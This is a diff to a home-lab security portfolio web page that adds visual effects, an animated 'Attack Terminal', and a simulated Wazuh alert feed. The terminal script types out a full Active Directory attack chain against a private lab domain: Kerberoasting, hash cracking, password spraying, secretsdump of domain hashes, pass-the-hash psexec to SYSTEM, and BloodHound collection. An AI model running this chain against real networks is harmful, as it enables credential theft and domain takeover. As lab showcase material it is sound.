@@ -450,6 +450,121 @@
     .skill-list li { padding: 2px 0; display: flex; align-items: center; gap: 7px; }
     .skill-list li::before { content: '›'; color: var(--muted); font-size: 12px; }
 
+    /* ── SCROLL PROGRESS BAR ── */
+    #scroll-bar {
+      position: fixed; top: 0; left: 0; height: 2px;
+      background: linear-gradient(90deg, #00d4aa, #7c6af7);
+      width: 0%; z-index: 9999; transition: width 0.1s;
+    }
+
+    /* ── BACK TO TOP ── */
+    #back-top {
+      position: fixed; bottom: 28px; right: 28px; z-index: 999;
+      width: 40px; height: 40px; border-radius: 50%;
+      background: var(--surface); border: 1px solid var(--accent);
+      color: var(--accent); font-size: 18px; cursor: pointer;
+      display: none; align-items: center; justify-content: center;
+      transition: all 0.2s; font-family: var(--mono);
+    }
+    #back-top:hover { background: var(--accent); color: #000; }
+    #back-top.show { display: flex; }
+
+    /* ── MATRIX CANVAS ── */
+    #matrix-canvas {
+      position: absolute; top: 0; left: 0;
+      width: 100%; height: 100%;
+      opacity: 0.07; pointer-events: none;
+    }
+
+    /* ── COMMAND FEED ── */
+    .cmd-feed {
+      background: #050608;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 0;
+      overflow: hidden;
+      font-family: var(--mono);
+    }
+    .cmd-feed-bar {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      padding: 8px 14px;
+      display: flex; align-items: center; gap: 8px;
+      font-size: 11px; color: var(--muted);
+    }
+    .cmd-feed-dot {
+      width: 10px; height: 10px; border-radius: 50%;
+    }
+    .cmd-feed-body {
+      padding: 14px 16px;
+      height: 220px;
+      overflow: hidden;
+      position: relative;
+    }
+    .cmd-line {
+      font-size: 11px;
+      line-height: 1.7;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .cmd-line.prompt { color: var(--accent); }
+    .cmd-line.output { color: var(--muted); padding-left: 12px; }
+    .cmd-line.success { color: var(--success); padding-left: 12px; }
+    .cmd-line.danger  { color: var(--danger);  padding-left: 12px; }
+    .cmd-line.warn    { color: var(--warn);    padding-left: 12px; }
+    .cmd-cursor { display: inline-block; width: 7px; height: 12px; background: var(--accent); vertical-align: text-bottom; animation: blink 1s step-end infinite; }
+    @keyframes blink { 50% { opacity: 0; } }
+
+    /* ── ALERT TIMELINE ── */
+    .alert-feed {
+      background: #050608;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow: hidden;
+      font-family: var(--mono);
+    }
+    .alert-feed-bar {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      padding: 8px 14px;
+      display: flex; align-items: center; justify-content: space-between;
+      font-size: 11px; color: var(--muted);
+    }
+    .alert-live {
+      display: flex; align-items: center; gap: 6px;
+      font-size: 10px; color: var(--danger);
+    }
+    .alert-live-dot {
+      width: 6px; height: 6px; border-radius: 50%;
+      background: var(--danger);
+      animation: livePulse 1.2s ease-in-out infinite;
+    }
+    @keyframes livePulse { 0%,100%{opacity:1} 50%{opacity:0.2} }
+    .alert-feed-body {
+      height: 220px; overflow: hidden; padding: 8px 0;
+    }
+    .alert-row {
+      display: grid;
+      grid-template-columns: 70px 48px 1fr;
+      gap: 0 12px;
+      padding: 5px 14px;
+      font-size: 11px;
+      border-bottom: 1px solid #0f1014;
+      align-items: center;
+    }
+    .alert-time { color: var(--muted); font-size: 10px; }
+    .alert-level {
+      font-size: 10px; padding: 1px 6px; border-radius: 3px;
+      text-align: center; font-weight: 600;
+    }
+    .lvl-3  { background: rgba(86,92,110,0.2);  color: #565c6e; }
+    .lvl-6  { background: rgba(62,207,142,0.15); color: #3ecf8e; }
+    .lvl-10 { background: rgba(240,165,0,0.15);  color: #f0a500; }
+    .lvl-12 { background: rgba(224,82,82,0.15);  color: #e05252; }
+    .lvl-14 { background: rgba(224,82,82,0.25);  color: #ff6b6b; font-weight:700; }
+    .alert-desc { color: var(--text); font-size: 11px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
     /* ── FOOTER ── */
     footer { border-top: 1px solid var(--border); padding: 32px 0; text-align: center; }
     footer p { font-family: var(--mono); font-size: 11px; color: var(--muted); letter-spacing: 0.05em; }
@@ -460,8 +575,12 @@
 <body>
 
 <!-- HEADER -->
-<header>
-  <div class="container">
+<div id="scroll-bar"></div>
+<button id="back-top" onclick="window.scrollTo({top:0,behavior:'smooth'})" title="Back to top">↑</button>
+
+<header style="position:relative;overflow:hidden;">
+  <canvas id="matrix-canvas"></canvas>
+  <div class="container" style="position:relative;z-index:1;">
     <p class="eyebrow">Home Lab Portfolio // 2026</p>
     <svg width="82" height="92" viewBox="0 0 82 92" xmlns="http://www.w3.org/2000/svg" style="margin:0 auto 8px;display:block;">
       <defs>
@@ -1340,6 +1459,42 @@
     </script>
   </section>
 
+  <!-- COMMAND FEED + ALERT TIMELINE -->
+  <section class="section">
+    <div class="section-label">Live Lab Activity</div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;">
+
+      <!-- Command Feed -->
+      <div>
+        <div style="font-family:var(--mono);font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;margin-bottom:10px;">Attack Terminal</div>
+        <div class="cmd-feed">
+          <div class="cmd-feed-bar">
+            <span class="cmd-feed-dot" style="background:#e05252;"></span>
+            <span class="cmd-feed-dot" style="background:#f0a500;"></span>
+            <span class="cmd-feed-dot" style="background:#3ecf8e;"></span>
+            <span style="margin-left:4px;">kali@192.168.137.60 ~ </span>
+          </div>
+          <div class="cmd-feed-body" id="cmd-body">
+            <div class="cmd-line prompt">❯ <span class="cmd-cursor"></span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Alert Timeline -->
+      <div>
+        <div style="font-family:var(--mono);font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;margin-bottom:10px;">Wazuh Alert Feed</div>
+        <div class="alert-feed">
+          <div class="alert-feed-bar">
+            <span>docker-host // DC01 // wazuh</span>
+            <span class="alert-live"><span class="alert-live-dot"></span>LIVE</span>
+          </div>
+          <div class="alert-feed-body" id="alert-body"></div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
   <!-- TIMELINE -->
   <section class="section">
     <div class="section-label">Project Timeline</div>
@@ -1680,6 +1835,199 @@
 
   /* ── OPEN P8 BY DEFAULT ── */
   document.getElementById('p8').classList.add('open');
+</script>
+
+<script>
+/* ── SCROLL PROGRESS + BACK TO TOP ── */
+window.addEventListener('scroll', function() {
+  const scrolled = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
+  document.getElementById('scroll-bar').style.width = scrolled + '%';
+  const btn = document.getElementById('back-top');
+  if (window.scrollY > 400) btn.classList.add('show');
+  else btn.classList.remove('show');
+});
+
+/* ── MATRIX RAIN ── */
+(function() {
+  const canvas = document.getElementById('matrix-canvas');
+  const ctx = canvas.getContext('2d');
+  const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモABCDEF0123456789';
+  let cols, drops, W, H;
+  function resize() {
+    W = canvas.offsetWidth; H = canvas.offsetHeight;
+    canvas.width = W; canvas.height = H;
+    cols = Math.floor(W / 14);
+    drops = Array(cols).fill(1);
+  }
+  function draw() {
+    ctx.fillStyle = 'rgba(10,12,15,0.05)';
+    ctx.fillRect(0, 0, W, H);
+    ctx.fillStyle = '#00d4aa';
+    ctx.font = '12px JetBrains Mono, monospace';
+    drops.forEach((y, i) => {
+      const ch = chars[Math.floor(Math.random() * chars.length)];
+      ctx.fillText(ch, i * 14, y * 14);
+      if (y * 14 > H && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    });
+  }
+  resize();
+  window.addEventListener('resize', resize);
+  setInterval(draw, 50);
+})();
+
+/* ── COMMAND FEED ── */
+(function() {
+  const sequences = [
+    [
+      {t:'prompt', txt:'impacket-GetUserSPNs lab.local/jsmith:Password123! -dc-ip 192.168.137.50 -request'},
+      {t:'output', txt:'ServicePrincipalName          Name     PasswordLastSet'},
+      {t:'output', txt:'----------------------------  -------  --------------------'},
+      {t:'output', txt:'MSSQLSvc/dc01.lab.local:1433  svc_sql  2026-08-14 04:43:39'},
+      {t:'warn',   txt:'$krb5tgs$23$*svc_sql$LAB.LOCAL$...a3f9e0b2c741d8...'},
+      {t:'success',txt:'[+] Hash saved to kerberoast.txt'},
+    ],
+    [
+      {t:'prompt', txt:'john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs'},
+      {t:'output', txt:'Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23)'},
+      {t:'output', txt:'Press q or Ctrl-C to abort...'},
+      {t:'success',txt:'Summer2024!      (svc_sql)'},
+      {t:'success',txt:'1g 0:00:00:00 DONE - Session completed'},
+    ],
+    [
+      {t:'prompt', txt:'nxc smb 192.168.137.50 -u jsmith sadmin svc_sql -p PASS --continue-on-success'},
+      {t:'output', txt:'SMB  192.168.137.50  445  DC01  Windows Server 2019'},
+      {t:'danger', txt:'[-] lab.local\\jsmith:Welcome2024 STATUS_LOGON_FAILURE'},
+      {t:'success',txt:'[+] lab.local\\sadmin:Welcome2024 (Pwn3d!)'},
+      {t:'danger', txt:'[-] lab.local\\svc_sql:Welcome2024 STATUS_LOGON_FAILURE'},
+    ],
+    [
+      {t:'prompt', txt:'impacket-secretsdump lab.local/sadmin@192.168.137.50'},
+      {t:'output', txt:'[*] Dumping Domain Credentials via DRSUAPI'},
+      {t:'warn',   txt:'Administrator:500:aad3b435:fbf12d80563e496af62ad2c748963cd2:::'},
+      {t:'warn',   txt:'krbtgt:502:aad3b435:88933a6959dc13a2f648c974713839bd:::'},
+      {t:'warn',   txt:'sadmin:1104:aad3b435:7099909e93b8345e3def4331473b8235:::'},
+      {t:'success',txt:'[*] All domain hashes extracted successfully'},
+    ],
+    [
+      {t:'prompt', txt:'impacket-psexec -hashes aad3b435:fbf12d80563e496af62ad2c748963cd2 Administrator@192.168.137.50'},
+      {t:'output', txt:'[*] Found writable share ADMIN$'},
+      {t:'output', txt:'[*] Uploading file xFpUkDmp.exe'},
+      {t:'output', txt:'[*] Creating service Ppxk on 192.168.137.50'},
+      {t:'output', txt:'[*] Starting service Ppxk...'},
+      {t:'success',txt:'C:\\Windows\\system32> whoami'},
+      {t:'danger', txt:'nt authority\\system'},
+    ],
+    [
+      {t:'prompt', txt:'SharpHound.exe -c All --domain lab.local --ldapusername jsmith'},
+      {t:'output', txt:'[+] Found usable DC: DC01.lab.local'},
+      {t:'output', txt:'[+] Beginning LDAP search for lab.local'},
+      {t:'output', txt:'[+] Status: 97 objects finished (+97 3.7/s)'},
+      {t:'success',txt:'[+] Enumeration finished in 00:00:26'},
+      {t:'success',txt:'[+] Output: 20260815163716_BloodHound.zip'},
+    ],
+  ];
+
+  const body = document.getElementById('cmd-body');
+  let seqIdx = 0, lineIdx = 0, charIdx = 0;
+  let lines = [];
+  let typing = false;
+
+  function addLine(type, text) {
+    const div = document.createElement('div');
+    div.className = 'cmd-line ' + type;
+    if (type === 'prompt') div.innerHTML = '❯ ';
+    body.appendChild(div);
+    // keep max 12 lines
+    while (body.children.length > 13) body.removeChild(body.firstChild);
+    body.scrollTop = body.scrollHeight;
+    return div;
+  }
+
+  function typeChar(el, text, i, cb) {
+    if (i >= text.length) { cb && cb(); return; }
+    el.textContent = (el.className.includes('prompt') ? '❯ ' : '') + text.slice(0, i+1);
+    const speed = el.className.includes('prompt') ? 28 : 4;
+    setTimeout(() => typeChar(el, text, i+1, cb), speed + Math.random()*10);
+  }
+
+  function runSequence() {
+    const seq = sequences[seqIdx % sequences.length];
+    if (lineIdx >= seq.length) {
+      seqIdx++;
+      lineIdx = 0;
+      setTimeout(() => {
+        // add blank gap
+        addLine('output', '');
+        runSequence();
+      }, 1800);
+      return;
+    }
+    const item = seq[lineIdx];
+    const el = addLine(item.t, '');
+    typeChar(el, item.txt, 0, () => {
+      lineIdx++;
+      const delay = item.t === 'prompt' ? 400 : 120;
+      setTimeout(runSequence, delay);
+    });
+  }
+
+  setTimeout(runSequence, 1000);
+})();
+
+/* ── ALERT TIMELINE ── */
+(function() {
+  const alerts = [
+    {time:'08:44:24', level:6,  lvlClass:'lvl-6',  desc:'Simple shell.php command execution.'},
+    {time:'08:44:32', level:6,  lvlClass:'lvl-6',  desc:'Simple shell.php command execution.'},
+    {time:'08:45:00', level:14, lvlClass:'lvl-14', desc:'LATERAL MOVEMENT: Multiple web shell commands — active attack chain'},
+    {time:'08:50:12', level:6,  lvlClass:'lvl-6',  desc:'Successful Remote Logon — NTLM auth possible pass-the-hash'},
+    {time:'08:50:12', level:5,  lvlClass:'lvl-6',  desc:'Logon failure - Unknown user or bad password.'},
+    {time:'08:56:58', level:14, lvlClass:'lvl-14', desc:'LATERAL MOVEMENT: Multiple web shell commands — active attack chain'},
+    {time:'09:44:09', level:3,  lvlClass:'lvl-3',  desc:'C2 simulator check-in observed'},
+    {time:'09:44:23', level:3,  lvlClass:'lvl-3',  desc:'Suricata: ET INFO Python BaseHTTP ServerBanner'},
+    {time:'09:45:07', level:10, lvlClass:'lvl-10', desc:'Suspicious DNS query to tunnel.local — possible DNS tunneling'},
+    {time:'09:45:13', level:12, lvlClass:'lvl-12', desc:'High volume DNS queries to tunnel domain — DNS tunneling likely'},
+    {time:'10:17:44', level:3,  lvlClass:'lvl-3',  desc:'C2 simulator check-in observed'},
+    {time:'10:17:58', level:12, lvlClass:'lvl-12', desc:'Possible C2 beaconing: 5+ check-ins from same source/90s'},
+    {time:'10:44:09', level:3,  lvlClass:'lvl-3',  desc:'Suricata: ET INFO Python BaseHTTP ServerBanner'},
+    {time:'10:49:39', level:6,  lvlClass:'lvl-6',  desc:'New file created in /tmp — possible attacker persistence'},
+    {time:'10:50:12', level:6,  lvlClass:'lvl-6',  desc:'Successful Remote Logon — NTLM auth possible pass-the-hash'},
+    {time:'05:39:41', level:6,  lvlClass:'lvl-6',  desc:'Kerberos service ticket requested — encryption type 0x17 (RC4)'},
+    {time:'05:55:08', level:6,  lvlClass:'lvl-6',  desc:'Successful Remote Logon — sadmin NTLM possible pass-the-hash'},
+    {time:'05:56:58', level:12, lvlClass:'lvl-12', desc:'Possible C2 beaconing: 5+ check-ins from same source/90s'},
+  ];
+
+  const body = document.getElementById('alert-body');
+  let idx = 0;
+
+  function addAlert() {
+    const a = alerts[idx % alerts.length];
+    const row = document.createElement('div');
+    row.className = 'alert-row';
+    row.style.opacity = '0';
+    row.style.transition = 'opacity 0.4s';
+    row.innerHTML =
+      '<span class="alert-time">' + a.time + '</span>' +
+      '<span class="alert-level ' + a.lvlClass + '">' + a.level + '</span>' +
+      '<span class="alert-desc">' + a.desc + '</span>';
+    body.appendChild(row);
+    setTimeout(() => { row.style.opacity = '1'; }, 20);
+    // trim old rows
+    while (body.children.length > 14) {
+      const old = body.firstChild;
+      old.style.opacity = '0';
+      setTimeout(() => { if(old.parentNode) old.parentNode.removeChild(old); }, 400);
+    }
+    body.scrollTop = body.scrollHeight;
+    idx++;
+    // vary speed: high severity alerts come in faster
+    const delay = a.level >= 12 ? 800 : a.level >= 10 ? 1200 : 1800;
+    setTimeout(addAlert, delay + Math.random() * 600);
+  }
+
+  setTimeout(addAlert, 600);
+})();
 </script>
 
 </body>
